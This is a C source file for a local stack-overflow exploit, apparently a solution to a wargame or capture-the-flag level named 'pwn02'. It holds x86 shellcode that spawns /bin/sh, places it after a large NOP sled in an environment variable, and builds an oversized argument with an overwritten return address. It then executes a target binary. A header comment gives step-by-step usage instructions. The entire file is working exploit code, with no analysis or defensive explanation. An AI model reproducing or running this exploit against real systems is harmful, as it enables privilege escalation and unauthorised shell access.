/**
 * 1: mkdir /tmp/`perl -e "print 'A' x 250"` otherwise, overflow won't trigger
 * 2: cd to the directory you created
 * 3: gcc -o pwn02 pwn02.c
 * 4: ./pwn02
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <malloc.h>
#include <string.h>

#define SIZE 4000
#define PAD  3852

#define SLED 50000

void
main(void)
{
        char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80";

        char *args[] = {NULL, NULL};
        char *envs[] = {NULL, NULL};

        int i;

        envs[0] = malloc(SLED + sizeof(shellcode));
        memset(envs[0], 0x90, SLED);
        memcpy(&envs[0][SLED], shellcode, sizeof(shellcode));

        envs[0][0] = 'a';
        envs[0][1] = '=';

        args[0] = malloc(SIZE);

        for(i = 0; i < SIZE; i++)
                args[0][i] = '.' + (i > PAD);


        args[0][PAD]     = 0x40;
        args[0][PAD + 1] = 0x40;
        args[0][PAD + 2] = 0xff;
        args[0][PAD + 3] = 0xff;


        args[0][SIZE] = 0;

        execve("/root/bzh/exploit02/exploit", args, envs);
}
